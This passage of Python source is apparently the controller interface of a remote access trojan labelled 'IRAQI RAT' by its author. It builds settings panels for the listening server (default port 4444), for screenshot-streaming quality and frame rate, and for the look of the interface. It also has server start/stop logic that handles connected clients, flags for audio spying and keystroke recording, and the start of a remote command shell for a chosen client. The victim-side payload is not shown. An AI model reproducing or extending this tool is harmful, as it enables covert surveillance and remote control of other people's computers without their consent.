                                                                "Use 0.0.0.0 to listen on all interfaces,\n"
                                                                "127.0.0.1 for local connections only."))
        ip_help_btn.pack(side=tk.RIGHT, padx=5)
        self.settings_buttons.append(ip_help_btn)
        
        # Default Port
        port_row = ctk.CTkFrame(address_frame, fg_color="transparent")
        port_row.pack(fill=tk.X, pady=3)
        
        port_label = ctk.CTkLabel(port_row, text="Default Port:", width=150, text_color=theme["fg_color"])
        port_label.pack(side=tk.LEFT, padx=5)
        
        self.default_port_entry = ctk.CTkEntry(port_row, width=200, 
                                            fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                            text_color=theme["fg_color"],
                                            border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                                            border_width=1,
                                            corner_radius=0)  # Square corners
        self.default_port_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.default_port_entry.insert(0, str(self.port))
        
        port_help_btn = ctk.CTkButton(port_row, text="?", width=30, height=30,
                                    corner_radius=0,  # Square corners
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"],
                                    text_color=theme["fg_color"],
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0,
                                    command=lambda: self.show_tooltip("Port Number", 
                                                                    "The default port the server will listen on.\n\n"
                                                                    "Valid ports are 1-65535. Ports below 1024\n"
                                                                    "often require administrator privileges."))
        port_help_btn.pack(side=tk.RIGHT, padx=5)
        self.settings_buttons.append(port_help_btn)
        
        # Buffer size
        buffer_row = ctk.CTkFrame(address_frame, fg_color="transparent")
        buffer_row.pack(fill=tk.X, pady=3)
        
        buffer_label = ctk.CTkLabel(buffer_row, text="Buffer Size:", width=150, text_color=theme["fg_color"])
        buffer_label.pack(side=tk.LEFT, padx=5)
        
        self.buffer_entry = ctk.CTkEntry(buffer_row, width=200, 
                                    fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                    text_color=theme["fg_color"],
                                    border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                                    border_width=1,
                                    corner_radius=0)  # Square corners
        self.buffer_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.buffer_entry.insert(0, str(self.BUFFER))
        
        buffer_help_btn = ctk.CTkButton(buffer_row, text="?", width=30, height=30,
                                    corner_radius=0,  # Square corners
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"],
                                    text_color=theme["fg_color"],
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0,
                                    command=lambda: self.show_tooltip("Buffer Size", 
                                                                    "The socket buffer size in bytes.\n\n"
                                                                    "Larger values allow more data to be sent at once,\n"
                                                                    "but consume more memory. Default: 4096"))
        buffer_help_btn.pack(side=tk.RIGHT, padx=5)
        self.settings_buttons.append(buffer_help_btn)
        
        # Timeout settings
        timeout_row = ctk.CTkFrame(address_frame, fg_color="transparent")
        timeout_row.pack(fill=tk.X, pady=3)
        
        timeout_label = ctk.CTkLabel(timeout_row, text="Connection Timeout:", width=150, text_color=theme["fg_color"])
        timeout_label.pack(side=tk.LEFT, padx=5)
        
        self.timeout_entry = ctk.CTkEntry(timeout_row, width=200, 
                                        fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                        text_color=theme["fg_color"],
                                        border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                                        border_width=1,
                                        corner_radius=0)  # Square corners
        self.timeout_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.timeout_entry.insert(0, str(getattr(self, "CONNECTION_TIMEOUT", 10)))
        
        timeout_help_btn = ctk.CTkButton(timeout_row, text="?", width=30, height=30,
                                    corner_radius=0,  # Square corners
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"],
                                    text_color=theme["fg_color"],
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0,
                                    command=lambda: self.show_tooltip("Connection Timeout", 
                                                                        "How long to wait (in seconds) for a client response\n"
                                                                        "before considering the connection timed out."))
        timeout_help_btn.pack(side=tk.RIGHT, padx=5)
        self.settings_buttons.append(timeout_help_btn)
        
        # Auto-start server option
        autostart_frame = ctk.CTkFrame(server_settings_frame, fg_color="transparent")
        autostart_frame.pack(fill=tk.X, padx=15, pady=5)
        
        self.autostart_var = tk.BooleanVar(value=getattr(self, "AUTO_START_SERVER", False))
        autostart_check = ctk.CTkCheckBox(autostart_frame, text="Auto-start server when application launches", 
                                    variable=self.autostart_var,
                                    onvalue=True, offvalue=False,
                                    fg_color=theme["accent_color"],
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0,
                                    text_color=theme["fg_color"],
                                    checkbox_height=20,  # Larger checkbox
                                    checkbox_width=20)
        autostart_check.pack(side=tk.LEFT, padx=5)
        
        # ===== USER INTERFACE SETTINGS SECTION =====
        ui_settings_frame = ctk.CTkFrame(main_container, 
                                      fg_color=theme["card_color"], 
                                      corner_radius=0,  # Square corners
                                      border_color=theme["border_color"] if "border_color" in theme else None,
                                      border_width=1 if "border_color" in theme else 0)
        ui_settings_frame.pack(fill=tk.X, padx=5, pady=10)
        
        ui_header = ctk.CTkLabel(ui_settings_frame, text="USER INTERFACE SETTINGS",  # All caps
                            font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                            size=FONT_STYLES["subheading"][1], 
                                            weight=FONT_STYLES["subheading"][2]),
                            text_color=theme["fg_color"])
        ui_header.pack(anchor="w", padx=15, pady=10)
        
        # Theme selection
        theme_frame = ctk.CTkFrame(ui_settings_frame, fg_color="transparent")
        theme_frame.pack(fill=tk.X, padx=15, pady=5)
        
        theme_label = ctk.CTkLabel(theme_frame, text="Visual Theme:", width=150, text_color=theme["fg_color"])
        theme_label.pack(side=tk.LEFT, padx=5)
        
        theme_options = list(self.THEMES.keys())
        theme_dropdown = ctk.CTkOptionMenu(theme_frame, values=theme_options, 
                                        variable=self.theme_var,
                                        command=self.change_theme,
                                        width=200, 
                                        fg_color=theme["button_color"],
                                        button_color=theme["accent_color"],
                                        button_hover_color=theme["hover_color"],
                                        dropdown_fg_color=theme["card_color"],
                                        dropdown_hover_color=theme["hover_color"],
                                        dropdown_text_color=theme["fg_color"],
                                        text_color=theme["fg_color"],
                                        corner_radius=0)  # Square corners
        theme_dropdown.pack(side=tk.LEFT, padx=5)
        
        
        # ===== MONITORING SETTINGS SECTION =====
        monitoring_frame = ctk.CTkFrame(main_container, 
                                     fg_color=theme["card_color"], 
                                     corner_radius=0,  # Square corners
                                     border_color=theme["border_color"] if "border_color" in theme else None,
                                     border_width=1 if "border_color" in theme else 0)
        monitoring_frame.pack(fill=tk.X, padx=5, pady=5)
        
        monitoring_header = ctk.CTkLabel(monitoring_frame, text="MONITORING SETTINGS",  # All caps
                                    font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                    size=FONT_STYLES["subheading"][1], 
                                                    weight=FONT_STYLES["subheading"][2]),
                                    text_color=theme["fg_color"])
        monitoring_header.pack(anchor="w", padx=15, pady=10)
        
        # Screenshot quality slider
        screenshot_frame = ctk.CTkFrame(monitoring_frame, fg_color="transparent")
        screenshot_frame.pack(fill=tk.X, padx=15, pady=5)
        
        screenshot_label = ctk.CTkLabel(screenshot_frame, text="Screenshot Quality:", width=150, text_color=theme["fg_color"])
        screenshot_label.pack(side=tk.LEFT, padx=5)
        
        self.screenshot_quality_var = tk.IntVar(value=getattr(self, "SCREENSHOT_QUALITY", 30))
        screenshot_slider = ctk.CTkSlider(screenshot_frame, from_=1, to=100, 
                                        number_of_steps=20,
                                        variable=self.screenshot_quality_var,
                                        command=self.update_screenshot_quality,
                                        progress_color=theme["accent_color"],
                                        button_color=theme["accent_color"],
                                        button_hover_color=theme["hover_color"],
                                        fg_color=theme["bg_color"],
                                        height=16,  # Taller slider
                                        corner_radius=0)  # Square corners
        screenshot_slider.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        self.screenshot_quality_label = ctk.CTkLabel(screenshot_frame, 
                                                text=f"{self.screenshot_quality_var.get()}%", 
                                                width=50,
                                                text_color=theme["fg_color"])
        self.screenshot_quality_label.pack(side=tk.LEFT, padx=5)
        
        # Screenshot FPS slider
        screenshot_fps_frame = ctk.CTkFrame(monitoring_frame, fg_color="transparent")
        screenshot_fps_frame.pack(fill=tk.X, padx=15, pady=5)
        
        screenshot_fps_label = ctk.CTkLabel(screenshot_fps_frame, text="Screenshot FPS:", width=150, text_color=theme["fg_color"])
        screenshot_fps_label.pack(side=tk.LEFT, padx=5)
        
        # Convert interval to FPS
        current_interval = getattr(self, "SCREENSHOT_INTERVAL", 1/10)
        current_fps = int(1 / current_interval)
        
        self.screenshot_fps_var = tk.IntVar(value=current_fps)
        screenshot_fps_slider = ctk.CTkSlider(screenshot_fps_frame, from_=1, to=30, 
                                            number_of_steps=29,
                                            variable=self.screenshot_fps_var,
                                            command=self.update_screenshot_fps,
                                            progress_color=theme["accent_color"],
                                            button_color=theme["accent_color"],
                                            button_hover_color=theme["hover_color"],
                                            fg_color=theme["bg_color"],
                                            height=16,  # Taller slider
                                            corner_radius=0)  # Square corners
        screenshot_fps_slider.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        self.screenshot_fps_label = ctk.CTkLabel(screenshot_fps_frame, text=f"{current_fps} FPS", width=50, text_color=theme["fg_color"])
        self.screenshot_fps_label.pack(side=tk.LEFT, padx=5)
        
        
        # ===== BUTTONS SECTION =====
        button_frame = ctk.CTkFrame(main_container, fg_color="transparent")
        button_frame.pack(fill=tk.X, padx=5, pady=15)
        
        # Auto-save settings
        self.autosave_var = tk.BooleanVar(value=True)
        autosave_check = ctk.CTkCheckBox(button_frame, text="Auto-save settings on exit", 
                                    variable=self.autosave_var,
                                    onvalue=True, offvalue=False,
                                    fg_color=theme["accent_color"],
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0,
                                    text_color=theme["fg_color"],
                                    checkbox_height=20,  # Larger checkbox
                                    checkbox_width=20)
        autosave_check.pack(side=tk.LEFT, padx=5)
        
        # Save Settings button
        save_settings_btn = ctk.CTkButton(button_frame, text="SAVE SETTINGS",  # All caps
                                        command=self.save_settings,
                                        fg_color=theme["accent_color"],
                                        hover_color=theme["hover_color"],
                                        text_color="#000000",  # Black on accent for contrast
                                        border_color=theme["border_color"] if "border_color" in theme else None,
                                        border_width=1 if "border_color" in theme else 0,
                                        corner_radius=0,  # Square corners
                                        height=32)  # Taller button
        save_settings_btn.pack(side=tk.RIGHT, padx=5)
        self.settings_buttons.append(save_settings_btn)
        
        # Load Settings button
        load_settings_btn = ctk.CTkButton(button_frame, text="LOAD SETTINGS",  # All caps
                                        command=self.load_settings,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        text_color=theme["fg_color"],
                                        border_color=theme["border_color"] if "border_color" in theme else None,
                                        border_width=1 if "border_color" in theme else 0,
                                        corner_radius=0,  # Square corners
                                        height=32)  # Taller button
        load_settings_btn.pack(side=tk.RIGHT, padx=5)
        self.settings_buttons.append(load_settings_btn)
        
        # Default Settings button
        default_settings_btn = ctk.CTkButton(button_frame, text="RESTORE DEFAULTS",  # All caps
                                        command=self.restore_default_settings,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        text_color=theme["fg_color"],
                                        border_color=theme["border_color"] if "border_color" in theme else None,
                                        border_width=1 if "border_color" in theme else 0,
                                        corner_radius=0,  # Square corners
                                        height=32)  # Taller button
        default_settings_btn.pack(side=tk.RIGHT, padx=5)
        self.settings_buttons.append(default_settings_btn)
        
        # ===== HELP SECTION =====
        help_frame = ctk.CTkFrame(main_container, 
                               fg_color=theme["card_color"], 
                               corner_radius=0,  # Square corners
                               border_color=theme["border_color"] if "border_color" in theme else None,
                               border_width=1 if "border_color" in theme else 0)
        help_frame.pack(fill=tk.X, padx=5, pady=5)
        
        about_header = ctk.CTkLabel(help_frame, text="ABOUT",  # All caps
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]),
                                text_color=theme["fg_color"])
        about_header.pack(anchor="w", padx=15, pady=10)
        
        about_text = ctk.CTkLabel(help_frame, 
                            text="IRAQI RAT BY << Apkaless\nVersion 1.0",  # All caps
                            justify="center",
                            text_color=theme["fg_color"])
        about_text.pack(pady=5)
        
        # Help and Documentation buttons
        help_buttons_frame = ctk.CTkFrame(help_frame, fg_color="transparent")
        help_buttons_frame.pack(fill=tk.X, padx=15, pady=10)
        
        docs_btn = ctk.CTkButton(help_buttons_frame, text="DON'T CLICK",  # All caps
                            command=self.open_anonymous,
                            fg_color=theme["button_color"],
                            hover_color=theme["hover_color"],
                            text_color=theme["fg_color"],
                            border_color=theme["border_color"] if "border_color" in theme else None,
                            border_width=1 if "border_color" in theme else 0,
                            corner_radius=0,  # Square corners
                            height=32)  # Taller button
        docs_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        self.settings_buttons.append(docs_btn)
        
        help_btn = ctk.CTkButton(help_buttons_frame, text="INSTAGRAM",  # All caps
                            command=self.open_instagram,
                            fg_color=theme["button_color"],
                            hover_color=theme["hover_color"],
                            text_color=theme["fg_color"],
                            border_color=theme["border_color"] if "border_color" in theme else None,
                            border_width=1 if "border_color" in theme else 0,
                            corner_radius=0,  # Square corners
                            height=32)  # Taller button
        help_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        self.settings_buttons.append(help_btn)
        
        check_updates_btn = ctk.CTkButton(help_buttons_frame, text="GITHUB",  # All caps
                                        command=self.open_github,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        text_color=theme["fg_color"],
                                        border_color=theme["border_color"] if "border_color" in theme else None,
                                        border_width=1 if "border_color" in theme else 0,
                                        corner_radius=0,  # Square corners
                                        height=32)  # Taller button
        check_updates_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        self.settings_buttons.append(check_updates_btn)
        
        # Register new components with theme manager
        if hasattr(self, 'theme_manager'):
            # Track frames
            self.theme_manager.track_widget(server_settings_frame)
            self.theme_manager.track_widget(ui_settings_frame)
            self.theme_manager.track_widget(monitoring_frame)
            self.theme_manager.track_widget(help_frame)
            
            # Track headers
            self.theme_manager.track_widget(server_header, "label")
            self.theme_manager.track_widget(ui_header, "label")
            self.theme_manager.track_widget(monitoring_header, "label")
            self.theme_manager.track_widget(about_header, "label")
            self.theme_manager.track_widget(about_text, "label")
            
            # Track input fields
            self.theme_manager.track_widget(self.default_ip_entry)
            self.theme_manager.track_widget(self.default_port_entry)
            self.theme_manager.track_widget(self.buffer_entry)
            self.theme_manager.track_widget(self.timeout_entry)
            
            # Track sliders
            self.theme_manager.track_widget(screenshot_slider)
            self.theme_manager.track_widget(screenshot_fps_slider)
            
            # Track dropdowns
            self.theme_manager.track_widget(theme_dropdown)
            
            # Track buttons
            for btn in self.settings_buttons:
                self.theme_manager.track_widget(btn)
            
            # Track checkboxes
            self.theme_manager.track_widget(autostart_check)
            self.theme_manager.track_widget(autosave_check)

    def update_settings_buttons(self):
        """Update all settings buttons to match the current theme"""
        if hasattr(self, 'settings_buttons') and hasattr(self, 'current_theme'):
            theme = self.THEMES[self.current_theme]
            
            for btn in self.settings_buttons:
                # Check if this is Save Settings button (special handling for accent button)
                if btn.cget("text") == "SAVE SETTINGS":
                    btn.configure(
                        fg_color=theme["accent_color"],
                        hover_color=theme["hover_color"],
                        text_color="#000000",  # Black text for contrast on accent
                        border_color=theme["border_color"] if "border_color" in theme else None,
                        border_width=1 if "border_color" in theme else 0,
                        corner_radius=0  # Ensure square corners
                    )
                else:
                    # Regular button styling
                    btn.configure(
                        fg_color=theme["button_color"],
                        hover_color=theme["hover_color"],
                        text_color=theme["fg_color"],
                        border_color=theme["border_color"] if "border_color" in theme else None,
                        border_width=1 if "border_color" in theme else 0,
                        corner_radius=0  # Ensure square corners
                    )
                    
    def show_tooltip(self, title, message):
        """Show a custom tooltip with helpful information"""
        tooltip = ctk.CTkToplevel(self.root)
        tooltip.title(title)
        tooltip.geometry("400x200")
        tooltip.resizable(False, False)
        tooltip.transient(self.root)  # Stay on top of the main window
        
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create tooltip content
        frame = ctk.CTkFrame(tooltip, corner_radius=10)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = ctk.CTkLabel(frame, text=title, 
                                font=ctk.CTkFont(size=16, weight="bold"))
        title_label.pack(pady=(10, 5))
        
        # Help message
        message_label = ctk.CTkLabel(frame, text=message, 
                                font=ctk.CTkFont(size=12),
                                justify="left",
                                wraplength=350)
        message_label.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
        
        # Close button
        close_btn = ctk.CTkButton(frame, text="Close", 
                            command=tooltip.destroy,
                            width=80)
        close_btn.pack(pady=(0, 10))
        
        # Center the tooltip relative to the main window
        tooltip.update_idletasks()
        x = self.root.winfo_x() + (self.root.winfo_width() // 2) - (tooltip.winfo_width() // 2)
        y = self.root.winfo_y() + (self.root.winfo_height() // 2) - (tooltip.winfo_height() // 2)
        tooltip.geometry(f"+{x}+{y}")
        
        # Make the tooltip modal
        tooltip.grab_set()
        tooltip.focus_set()
        
        # Auto-close after 10 seconds
        tooltip.after(10000, tooltip.destroy)


    def update_screenshot_quality(self, value=None):
        """Update screenshot quality setting"""
        quality = self.screenshot_quality_var.get()
        self.screenshot_quality_label.configure(text=f"{quality}%")
        
        # Update the actual quality setting
        self.SCREENSHOT_QUALITY = quality

    def update_screenshot_fps(self, value=None):
        """Update screenshot FPS setting"""
        fps = self.screenshot_fps_var.get()
        self.screenshot_fps_label.configure(text=f"{fps} FPS")
        
        # Convert FPS to interval
        self.SCREENSHOT_INTERVAL = 1 / fps


    def open_anonymous(self):
        try:
            import webbrowser
            webbrowser.open("https://www.youtube.com/watch?v=NAUcHiRHMUE")  # Change to actual documentation URL
        except:
            messagebox.showinfo("Alert", "You are Being Directed to Anonymous Source")

    def open_instagram(self):
        try:
            import webbrowser
            webbrowser.open("https://www.instagram.com/apkaless")  # Change to actual documentation URL
        except:
            messagebox.showinfo("Alert", "You are Being Directed to Anonymous Source")

    def open_github(self):
        try:
            import webbrowser
            webbrowser.open("https://www.github.com/apkaless")  # Change to actual documentation URL
        except:
            messagebox.showinfo("Alert", "You are Being Directed to Anonymous Source")


    def restore_default_settings(self):
        """Restore all settings to default values"""
        # Ask for confirmation
        if not messagebox.askyesno("Restore Defaults", 
                                "Are you sure you want to restore all settings to their default values?"):
            return
        
        # Server settings
        self.default_ip_entry.delete(0, tk.END)
        self.default_ip_entry.insert(0, "127.0.0.1")
        
        self.default_port_entry.delete(0, tk.END)
        self.default_port_entry.insert(0, "4444")
        
        self.buffer_entry.delete(0, tk.END)
        self.buffer_entry.insert(0, "4096")
        
        self.timeout_entry.delete(0, tk.END)
        self.timeout_entry.insert(0, "10")
        
        self.autostart_var.set(False)
        
        # UI settings
        self.theme_var.set("Dark")
        self.change_theme("Dark")
        
        # Monitoring settings
        self.screenshot_quality_var.set(30)
        self.screenshot_quality_label.configure(text="30%")
        self.SCREENSHOT_QUALITY = 30
        
        self.screenshot_fps_var.set(10)
        self.screenshot_fps_label.configure(text="10 FPS")
        self.SCREENSHOT_INTERVAL = 0.1
        
        # Save settings checkbox
        self.autosave_var.set(True)
        
        # Log the action
        self.log("Settings restored to defaults", log_type="info")

    def save_settings(self):
        """Save all settings to a configuration file"""
        # Collect all settings
        settings = {
            # Server settings
            "ip": self.default_ip_entry.get(),
            "port": int(self.default_port_entry.get()),
            "buffer": int(self.buffer_entry.get()),
            "timeout": int(self.timeout_entry.get()),
            "auto_start_server": self.autostart_var.get(),
            # UI settings
            "theme": self.theme_var.get(),
            # Monitoring settings
            "screenshot_quality": self.screenshot_quality_var.get(),
            "screenshot_fps": self.screenshot_fps_var.get(),
            # Auto-save setting
            "autosave": self.autosave_var.get()
        }
        
        # Save to file
        try:
            with open("rat_settings.json", "w") as f:
                json.dump(settings, f, indent=4)
            
            self.log("Settings saved successfully", log_type="success")
            
            # Apply some settings immediately
            self.BUFFER = int(self.buffer_entry.get())
            self.ip = self.default_ip_entry.get()
            self.port = int(self.default_port_entry.get())
            self.address = (self.ip, self.port)
            self.CONNECTION_TIMEOUT = int(self.timeout_entry.get())
            self.SCREENSHOT_QUALITY = self.screenshot_quality_var.get()
            self.SCREENSHOT_INTERVAL = 1 / self.screenshot_fps_var.get()
            self.AUTO_START_SERVER = self.autostart_var.get()
            
        except Exception as e:
            self.log(f"Error saving settings: {e}", log_type="error")
            messagebox.showerror("Error", f"Could not save settings: {e}")

    def load_settings(self):
        """Load settings from configuration file"""
        try:
            with open("rat_settings.json", "r") as f:
                settings = json.load(f)
            
            # Apply server settings
            self.default_ip_entry.delete(0, tk.END)
            self.default_ip_entry.insert(0, settings.get("ip", "127.0.0.1"))
            
            self.default_port_entry.delete(0, tk.END)
            self.default_port_entry.insert(0, str(settings.get("port", 4444)))
            
            self.buffer_entry.delete(0, tk.END)
            self.buffer_entry.insert(0, str(settings.get("buffer", 4096)))
            
            self.timeout_entry.delete(0, tk.END)
            self.timeout_entry.insert(0, str(settings.get("timeout", 10)))
            
            self.autostart_var.set(settings.get("auto_start_server", False))
            
            # Apply UI settings
            theme_name = settings.get("theme", "Dark")
            self.theme_var.set(theme_name)
            self.change_theme(theme_name)
            
            # Apply monitoring settings
            self.screenshot_quality_var.set(settings.get("screenshot_quality", 30))
            self.screenshot_quality_label.configure(text=f"{settings.get('screenshot_quality', 30)}%")
            
            fps = settings.get("screenshot_fps", 10)
            self.screenshot_fps_var.set(fps)
            self.screenshot_fps_label.configure(text=f"{fps} FPS")
            
            # Apply auto-save setting
            self.autosave_var.set(settings.get("autosave", True))
            
            # Update internal variables
            self.BUFFER = settings.get("buffer", 4096)
            self.ip = settings.get("ip", "127.0.0.1")
            self.port = settings.get("port", 4444)
            self.address = (self.ip, self.port)
            self.CONNECTION_TIMEOUT = settings.get("timeout", 10)
            self.SCREENSHOT_QUALITY = settings.get("screenshot_quality", 30)
            self.SCREENSHOT_INTERVAL = 1 / settings.get("screenshot_fps", 10)
            self.AUTO_START_SERVER = settings.get("auto_start_server", False)
            
            self.log("Settings loaded successfully", log_type="success")
            
        except FileNotFoundError:
            self.log("No settings file found. Using defaults.", log_type="warning")
        except Exception as e:
            self.log(f"Error loading settings: {e}", log_type="error")
            messagebox.showerror("Error", f"Could not load settings: {e}")
                
    # Add auto-save hook to application exit
    def on_closing(self):
        """Handle application closing and auto-save settings if enabled"""
        if hasattr(self, 'autosave_var') and self.autosave_var.get():
            self.save_settings()
        
        # Stop server if running
        if self.is_server_running:
            self.stop_server()
        
        # Destroy the root window
        self.root.destroy()
            
    def change_theme(self, theme_name):
        """Update the theme for all components using the theme manager."""
        self.current_theme = theme_name
        
        # Apply theme via the theme manager
        self.theme_manager.apply_theme(theme_name)
        
        # Log theme change
        self.log(f"Theme changed to: {theme_name}")
    
    
    def log(self, msg, log_type="info"):
        """Enhanced logging with message type support"""
        # Update log in GUI
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_entry = f"[{timestamp}] {str(msg)}"
        
        self.log_text.configure(state="normal")
        
        # Use appropriate tag based on log type
        if log_type == "warning":
            self.log_text.insert(tk.END, log_entry + "\n", "warning")
            # Also add to alerts for warnings
            self.add_alert(f"Warning: {msg}")
        elif log_type == "error":
            self.log_text.insert(tk.END, log_entry + "\n", "error")
            # Also add to alerts for errors
            self.add_alert(f"Error: {msg}")
        elif log_type == "success":
            self.log_text.insert(tk.END, log_entry + "\n", "success")
        elif log_type == "client":
            self.log_text.insert(tk.END, log_entry + "\n", "client")
        else:
            self.log_text.insert(tk.END, log_entry + "\n", "info")
        
        self.log_text.see(tk.END)
        self.log_text.configure(state="disabled")
        
        # Update status bar
        self.status_bar.configure(text=str(msg))

    def start_performance_monitoring(self):
        """Start thread to monitor system performance"""
        # Cancel any existing monitoring
        if hasattr(self, 'performance_after_id'):
            self.root.after_cancel(self.performance_after_id)
        
        # Start new monitoring cycle
        self.update_performance_metrics()
        
    def update_performance_metrics(self):
        """Update performance metrics display"""
        try:
            import psutil
            
            # Update CPU usage
            cpu_percent = psutil.cpu_percent(interval=0.5)
            self.cpu_value.configure(text=f"{cpu_percent:.1f}%")
            self.cpu_progress.set(cpu_percent / 100)
            
            # Update memory usage
            memory = psutil.virtual_memory()
            memory_percent = memory.percent
            self.memory_value.configure(text=f"{memory_percent:.1f}%")
            self.memory_progress.set(memory_percent / 100)
            
            # Update network I/O
            net_io = psutil.net_io_counters()
            if hasattr(self, 'prev_net_io'):
                # Calculate bytes per second
                send_rate = (net_io.bytes_sent - self.prev_net_io.bytes_sent) / 1
                recv_rate = (net_io.bytes_recv - self.prev_net_io.bytes_recv) / 1
                total_rate = send_rate + recv_rate
                
                # Format as human-readable
                rate_str = self.format_size(total_rate) + "/s"
                self.network_value.configure(text=rate_str)
            
            # Store current network stats for next calculation
            self.prev_net_io = net_io
            
            # Update uptime if server is running
            if self.is_server_running and self.start_time is not None:
                self.update_uptime()
            
        except ImportError:
            # psutil not available, show N/A values
            self.cpu_value.configure(text="N/A")
            self.memory_value.configure(text="N/A")
            self.network_value.configure(text="N/A")
            
        except Exception as e:
            # Log error but don't stop monitoring
            print(f"Error updating performance metrics: {e}")
        
        # Schedule next update
        self.performance_after_id = self.root.after(1000, self.update_performance_metrics)

    def update_uptime(self):
        """Update the uptime display for both old and new dashboard"""
        if self.start_time is not None:
            current_time = time.time()
            uptime_seconds = int(current_time - self.start_time)
            
            # Format as HH:MM:SS
            hours, remainder = divmod(uptime_seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            uptime_str = f"{hours:02}:{minutes:02}:{seconds:02}"
            
            # Update value in old dashboard
            if hasattr(self, 'uptime_value'):
                self.uptime_value.configure(text=uptime_str)
            
            # Update summary card in new dashboard
            if hasattr(self, 'summary_cards') and 'uptime' in self.summary_cards:
                self.summary_cards['uptime'].value_label.configure(text=uptime_str)
            
    # Server operations
    def start_server_gui(self):
        # Get IP and port from inputs
        try:
            self.ip = self.ip_entry.get()
            self.port = int(self.port_entry.get())
            self.address = (self.ip, self.port)
            
            threading.Thread(target=self.start_server, daemon=True).start()

            self.start_server_btn.configure(state="disabled")
            self.stop_server_btn.configure(state="normal")
            
        except ValueError:
            messagebox.showerror("Error", "Port must be a valid number")
        except Exception as e:
            messagebox.showerror("Error", f"Could not start server: {e}")
    
    def start_server(self):
        """Enhanced version of start_server with uptime tracking"""
        if not self.is_server_running:
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.bind(self.address)
                self.server_socket.listen()
                self.is_server_running = True
                
                # Start uptime tracking
                self.start_time = time.time()
                
                # Update UI with proper status indicators
                if hasattr(self, 'server_status_value'):
                    self.server_status_value.configure(text="Online", text_color=self.THEMES[self.current_theme]["success_color"])
                if hasattr(self, 'server_address_value'):
                    self.server_address_value.configure(text=f"{self.address[0]}:{self.address[1]}")
                
                # Update modern dashboard indicators
                if hasattr(self, 'server_status_label'):
                    self.server_status_label.configure(text="Server Online")
                if hasattr(self, 'server_address_label'):
                    self.server_address_label.configure(text=f"{self.address[0]}:{self.address[1]}")
                if hasattr(self, 'server_status_light'):
                    self.server_status_light.configure(text_color=self.THEMES[self.current_theme]["success_color"])
                
                # Update sidebar indicator
                self.update_server_status_indicator(is_running=True)
                
                # Log the server start
                self.log(f"Server is now running on {self.address[0]}:{self.address[1]}", log_type="success")
                self.add_alert("Server started successfully")
                
                # Start accepting clients
                threading.Thread(target=self.accept_clients, daemon=True).start()
                
            except (ConnectionError, ConnectionResetError, ConnectionRefusedError) as err:
                self.log(f"Connection Error: {err}", log_type="error")
                self.is_server_running = False
                self.stop_server()
                messagebox.showerror("Connection Error", str(err))
        else:
            self.log("Server Already Running", log_type="warning")


    # Fix stop_server method to update the proper status indicators
    def stop_server(self):
        """Enhanced version of stop_server with uptime reset"""
        try:
            if self.is_server_running:
                self.is_server_running = False
                self.receive_screenshot_trigger = False
                self.audiospy_trigger = False
                self.keyboard_recording_trigger = False
                
                # Reset uptime tracking
                self.start_time = None
                if hasattr(self, 'uptime_value'):
                    self.uptime_value.configure(text="00:00:00")
                
                # Close all client connections
                self.disconnect_all()
                
                # Close server socket
                if self.server_socket:
                    self.server_socket.close()
                    self.server_socket = None
                
                # Update UI with proper status indicators
                if hasattr(self, 'server_status_value'):
                    self.server_status_value.configure(text="Offline", text_color=self.THEMES[self.current_theme]["danger_color"])
                
                # Update modern dashboard indicators
                if hasattr(self, 'server_status_label'):
                    self.server_status_label.configure(text="Server Offline")
                if hasattr(self, 'server_status_light'):
                    self.server_status_light.configure(text_color=self.THEMES[self.current_theme]["danger_color"])
                
                # Update sidebar indicator
                self.update_server_status_indicator(is_running=False)
                
                # Update button states
                self.start_server_btn.configure(state="normal")
                self.stop_server_btn.configure(state="disabled")
                
                # Log the server stop
                self.log("Server has been stopped", log_type="warning")
                self.add_alert("Server stopped")
            else:
                self.log("Server isn't running", log_type="warning")
        except Exception as e:
            if self.server_socket:
                self.server_socket.close()
                self.server_socket = None
            self.log(f"Server has been stopped due to an error: {e}", log_type="error")
 
    def quick_command_shell(self):
        """Quick access to command shell for selected client"""
        # Check if a client is selected
        if not self.current_client_socket:
            # Try to select the first available client
            if len(self.clients) > 0:
                first_client = list(self.clients.items())[0]
                addr, (client_id, conn) = first_client
                self.current_client_socket = conn
